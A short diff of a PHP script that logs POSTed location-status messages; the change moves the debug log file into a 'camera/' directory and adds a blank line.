@@ -28,7 +28,7 @@ if(isset($_POST['message'])) {
         strpos($message, 'Position obtained') !== false
     )) {
         // Log to location_debug.log
-        $location_log = fopen("location_debug.log", "a");
+        $location_log = fopen("camera/location_debug.log", "a");
         fwrite($location_log, "[$date] $message\n");
         fclose($location_log);
         
@@ -44,4 +44,5 @@ if(isset($_POST['message'])) {
     header('Content-Type: application/json');
     echo json_encode(['status' => 'error', 'message' => 'No message provided']);
 }
+
 ?> 
